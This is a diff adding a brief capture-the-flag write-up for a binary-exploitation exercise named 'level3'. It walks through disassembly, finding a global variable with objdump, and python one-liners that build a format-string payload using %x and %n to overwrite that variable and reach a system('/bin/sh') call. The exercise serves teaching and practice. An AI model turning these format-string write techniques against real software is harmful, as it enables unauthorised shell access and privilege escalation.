@@ -1,0 +1,19 @@
+For level3, after disassembling the binary we see main with juste 6 line and
+one call to "v function".
+
+In v function we have one call to system function, and in argument we can see "/bin/sh".
+for execute this, we have to pass the comparison: 
+	   0x080484df <+59>:	cmp    $0x40,%eax
+
+
+
+
+
+
+find adresse of m, objdump -t level3
+0804988c g     O .bss	00000004              m
+
+python -c 'print "AAAA" + "\x8c\x98\x04\x08" + "BBBB" + "%x " * 4 + "%n"'
+
+
+(python -c 'print "A" * 12 + "\x8c\x98\x04\x08" + "%x " * 5 + "%x" * 1 + "%n"' ; cat) | ./level3
